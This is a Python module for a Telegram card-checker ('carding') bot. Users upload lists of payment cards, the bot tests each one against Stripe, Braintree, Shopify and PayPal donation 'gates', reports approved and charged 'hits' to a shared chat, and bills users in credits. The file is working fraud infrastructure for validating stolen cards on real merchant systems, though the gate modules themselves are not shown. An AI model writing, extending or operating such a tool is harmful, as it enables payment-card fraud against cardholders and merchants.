import threading
import time
import io
import multiprocessing
import logging
import json
from concurrent.futures import ThreadPoolExecutor
from telebot import types
from utils.admin_guard import is_admin
from storage.repositories.bans import is_banned
from storage.repositories.bin_bans import is_bin_banned
from security.channel_guard import is_channel_subscribed, send_channel_prompt
from storage.repositories.credits import get_credits, ensure_row, deduct_credits
from storage.repositories.gates import is_gate_enabled, get_limit, get_cost
from storage.repositories.sessions import save_session, get_session, get_all_active_sessions, end_session
from datetime import datetime
from config.settings import ADMIN_GROUP, HIT_CHAT, ADMINS
from utils.classify import classify_result
from utils.messages import (
    approved_message,
    charged_message,
    insufficient_funds_message,
    hit_detected_message,
    get_user_name,
    dato,
    declined_message
)
from collections import defaultdict
from threading import Lock

# ================= Logging Setup =================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# ================= Import Gates ==================
from gates.stripe_auth import check as stripe_auth_check
from gates.braintree_auth import check as braintree_auth_check
from gates.shopify_charge import check as shopify_charge_check
from gates.stripe_charge import check as stripe_charge_check
from gates.paypal_donation import check as paypal_donation_check

# ==================== Global ====================
MAX_THREADS = 15
cpu_count = multiprocessing.cpu_count()
max_threads = min(MAX_THREADS, max(1, cpu_count if cpu_count else 1))
executor = ThreadPoolExecutor(max_workers=max_threads)

sessions = {}
bot_instance = None

class ComboSession:
    def __init__(self, cards, original_filename, current_index=0, approved=0, charged=0, funds=0, declined=0):
        self.cards = cards
        self.original_filename = original_filename
        self.stop = False
        self.checking = False
        self.approved = approved
        self.charged = charged
        self.funds = funds
        self.declined = declined
        self.checked = current_index
        self.lock = Lock()

AVAILABLE_GATES = {
    "stripe_auth": {"name": "Stripe_Auth", "func": stripe_auth_check, "type": "AUTH"},
    "braintree_auth": {"name": "Braintree_Auth", "func": braintree_auth_check, "type": "AUTH"},
    "shopify_charge": {"name": "Shopify_Charge", "func": shopify_charge_check, "type": "CHARGE"},
    "stripe_charge": {"name": "Stripe_Charge", "func": stripe_charge_check, "type": "CHARGE"},
    "paypal_donation": {"name": "Paypal_Donation", "func": paypal_donation_check, "type": "CHARGE"},
}

MAX_RETRY = 3

def build_progress(percent: int, size: int = 10):
    filled = int((percent / 100) * size)
    return f"{'▰' * filled}{'▱' * (size - filled)} {percent}%"

def update_progress_ui(uid, chat_id, message_id, card, status, gate_name, total, gate_type):
    session = sessions.get(uid)
    if not session: return
    percent = int((session.checked / total) * 100) if total > 0 else 0
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(
        types.InlineKeyboardButton(f"━ 𝗖𝗖 • {card}", callback_data="x"),
        types.InlineKeyboardButton(f"━ 𝗦𝗧𝗔𝗧𝗨𝗦 • {status}", callback_data="x"),
        types.InlineKeyboardButton(f"━ {'𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅' if gate_type == 'AUTH' else '𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ⚡'} • {session.approved if gate_type == 'AUTH' else session.charged}", callback_data="x"),
        types.InlineKeyboardButton(f"━ {'𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌' if gate_type == 'AUTH' else '𝗙𝗨𝗡𝗗𝗦 💸'} • {session.declined if gate_type == 'AUTH' else session.funds}", callback_data="x"),
        types.InlineKeyboardButton(f"━ 𝗧𝗢𝗧𝗔𝗟 ⚡ • {session.checked} / {total}", callback_data="x"),
        types.InlineKeyboardButton("⛔ 𝗦𝗧𝗢𝗣 𝗖𝗛𝗘𝗖𝗞", callback_data="combo:stop"),
    )
    try:
        bot_instance.edit_message_text(
            f"<b>PLEASE WAIT CHECKING YOUR CARDS 💫\nGATE ➜ {gate_name}\n\n━━━━━━━━━━━━━━━━━━━━━━━\n{build_progress(percent)}\n━━━━━━━━━━━━━━━━━━━━━━━</b>",
            chat_id, message_id, reply_markup=kb, parse_mode="HTML"
        )
    except Exception: pass

def register_combo(bot):
    global bot_instance
    bot_instance = bot

    @bot.message_handler(content_types=["document"])
    def receive_combo(message):
        uid = message.from_user.id
        user_name = message.from_user.first_name
        if is_banned(uid):
            bot.send_message(message.chat.id, "<b>🚫 YOU ARE BANNED</b>", parse_mode="HTML")
            return
        if not is_channel_subscribed(bot, uid):
            send_channel_prompt(bot, message.chat.id, user_name)
            return
        try:
            file_info = bot.get_file(message.document.file_id)
            raw = bot.download_file(file_info.file_path)
            cards = [c.strip() for c in raw.decode(errors="ignore").splitlines() if c.strip()]
        except Exception as e:
            bot.send_message(message.chat.id, f"<b>❌ FAILED TO PROCESS FILE: {e}</b>", parse_mode="HTML")
            return
        if not cards:
            bot.send_message(message.chat.id, "<b>❌ EMPTY FILE</b>", parse_mode="HTML")
            return
        
        sessions[uid] = ComboSession(cards, message.document.file_name)
        kb = types.InlineKeyboardMarkup(row_width=1)
        for key, data in AVAILABLE_GATES.items():
            if is_gate_enabled(key):
                kb.add(types.InlineKeyboardButton(data["name"], callback_data=f"combo:gate:{key}"))
        bot.send_message(message.chat.id, "<b>ϟ CHOOSE THE GATEWAY ϟ</b>", reply_markup=kb, parse_mode="HTML")

    @bot.callback_query_handler(func=lambda c: c.data == "combo:stop")
    def stop_combo(c):
        uid = c.from_user.id
        if uid in sessions:
            sessions[uid].stop = True
            end_session(uid)
            bot.answer_callback_query(c.id, "⛔ Stop requested")

    @bot.callback_query_handler(func=lambda c: c.data.startswith("combo:gate:"))
    def start_check(c):
        uid = c.from_user.id
        user_name = get_user_name(c.from_user)
        gate_key = c.data.split(":")[-1]
        session = sessions.get(uid)
        if not session or session.checking:
            bot.answer_callback_query(c.id, "A check is already running or session expired.", show_alert=True)
            return
        
        ensure_row(uid)
        gate_info = AVAILABLE_GATES[gate_key]
        total_limit = get_limit(gate_key)
        
        if not is_admin(uid) and len(session.cards) > total_limit:
            bot.answer_callback_query(c.id, f"❌ عدد الكروت اكبر الليمت ({total_limit})", show_alert=True)
            return

        cost = get_cost(gate_key)
        total = len(session.cards)
        
        user_credits = get_credits(uid)
        if not is_admin(uid) and user_credits < cost:
            bot.answer_callback_query(c.id, f"⛔ Not enough credits ({user_credits} < {cost})", show_alert=True)
            return
        
        # 🚫 BIN FILTERING
        valid_cards = []
        banned_count = 0
        banned_notified = False
        for card in session.cards:
            bin_num = card[:6]
            if is_bin_banned(bin_num):
                banned_count += 1
                if not banned_notified:
                    admin_msg = f"<b>🚨 محاولة استعمال بين محظور في كومبو!</b>\n\n<b>👤 المستخدم:</b> {user_name} (<code>{uid}</code>)\n<b>💳 الكرت:</b> <code>{card}</code>\n<b>🚫 البين:</b> <code>{bin_num}</code>"
                    for admin_id in ADMINS:
                        try: bot.send_message(admin_id, admin_msg, parse_mode="HTML")
                        except: pass
                    banned_notified = True
            else:
                valid_cards.append(card)
        
        if banned_count > 0:
            bot.send_message(chat_id, f"<b>⚠️ تم تخطي ({banned_count}) كروت لانها محظوره</b>", parse_mode="HTML")
        
        if not valid_cards:
            bot.send_message(chat_id, "<b>❌ كل الكروت في الملف محظورة</b>", parse_mode="HTML")
            return

        session.cards = valid_cards
        total = len(valid_cards)
        session.checking = True
        session.stop = False
        chat_id = c.message.chat.id
        message_id = c.message.message_id
        
        # حفظ الجلسة في قاعدة البيانات قبل البدء
        save_session(uid, gate_key, 0, total, session.cards, 0, 0, 0, 0, chat_id, message_id)
        
        executor.submit(run_check, uid, chat_id, message_id, gate_key, total, cost, user_name)

def run_check(uid, chat_id, message_id, gate_key, total, cost, user_name):
    session = sessions.get(uid)
    if not session: return
    gate_info = AVAILABLE_GATES.get(gate_key)
    if not gate_info: return
    
    gate_func = gate_info["func"]
    gate_type = gate_info["type"]
    last_update_time = time.time()

    # البدء من المؤشر الحالي (لدعم الاستئناف)
    start_idx = session.checked
    for i in range(start_idx, total):
        if session.stop: break
        card = session.cards[i]
        
        current_credits = get_credits(uid)
        if not is_admin(uid) and current_credits < cost:
            session.stop = True
            bot_instance.send_message(chat_id, "<b>⚠️ CHECK STOPPED - INSUFFICIENT CREDITS</b>", parse_mode="HTML")
            break

        r_text = "Unknown Error"
        specific_gate_name = gate_info["name"]
        start_time = time.time()

        for attempt in range(MAX_RETRY):
            try:
                # دالة check تعيد الآن (النتيجة، اسم البوابة، اسم الدالة)
                res_tuple = gate_func(card)
                if isinstance(res_tuple, tuple) and len(res_tuple) == 3:
                    response, gate_map_name, func_name = res_tuple
                elif isinstance(res_tuple, tuple) and len(res_tuple) == 2:
                    response, gate_map_name = res_tuple
                    func_name = ""
                else:
                    response = res_tuple
                    gate_map_name = gate_info["name"]
                    func_name = ""

                r_text = str(response) if response else "Empty Response"
                specific_gate_name = gate_map_name
                if r_text and "error" not in r_text.lower():
                    break
            except Exception: pass
            time.sleep(1)

        status = classify_result(r_text)
        execution_time = time.time() - start_time

        with session.lock:
            session.checked += 1
            if status == "CHARGED":
                session.charged += 1
                msg = charged_message(card, r_text, specific_gate_name, execution_time, dato, checked_by_text=user_name, func_name=func_name)
                bot_instance.send_message(chat_id, msg, parse_mode="HTML")
                if HIT_CHAT: bot_instance.send_message(HIT_CHAT, msg, parse_mode="HTML")
            elif status == "APPROVED":
                session.approved += 1
                msg = approved_message(card, r_text, specific_gate_name, execution_time, dato, checked_by_text=user_name, func_name=func_name)
                bot_instance.send_message(chat_id, msg, parse_mode="HTML")
                if HIT_CHAT: bot_instance.send_message(HIT_CHAT, msg, parse_mode="HTML")
            elif status == "FUNDS":
                session.funds += 1
                msg = insufficient_funds_message(card, r_text, specific_gate_name, execution_time, dato, checked_by_text=user_name, func_name=func_name)
                bot_instance.send_message(chat_id, msg, parse_mode="HTML")
            else:
                session.declined += 1

            if not is_admin(uid): deduct_credits(uid, cost)
            
            # حفظ التقدم في قاعدة البيانات بعد كل كرت لضمان عدم الضياع
            save_session(uid, gate_key, session.checked, total, session.cards, 
                         session.approved, session.charged, session.funds, session.declined, 
                         chat_id, message_id)

        if time.time() - last_update_time > 10 or session.checked == total:
            update_progress_ui(uid, chat_id, message_id, card, status, specific_gate_name, total, gate_type)
            last_update_time = time.time()

    session.checking = False
    if session.checked == total:
        end_session(uid)
        bot_instance.send_message(chat_id, f"<b>✅ CHECK COMPLETED\nTOTAL: {session.checked}</b>", parse_mode="HTML")

def resume_all_sessions(bot):
    """استعادة كل الجلسات التي كانت تعمل قبل توقف البوت"""
    global bot_instance
    bot_instance = bot
    active_uids = get_all_active_sessions()
    for uid in active_uids:
        data = get_session(uid)
        if data and data['active']:
            logger.info(f"Resuming session for user {uid}")
            session = ComboSession(
                data['cards_data'], 
                "Resumed_File", 
                current_index=data['current_index'],
                approved=data['approved'],
                charged=data['charged'],
                funds=data['funds'],
                declined=data['declined']
            )
            session.checking = True
            sessions[uid] = session
            
            gate_key = data['gate_key']
            cost = get_cost(gate_key)
            
            # إرسال رسالة تنبيه للمستخدم
            try:
                bot.send_message(data['chat_id'], "<b>🔄 BOT RESTARTED - RESUMING YOUR CHECK...</b>", parse_mode="HTML")
            except: pass
            
            executor.submit(run_check, uid, data['chat_id'], data['message_id'], gate_key, data['total_cards'], cost, "User")
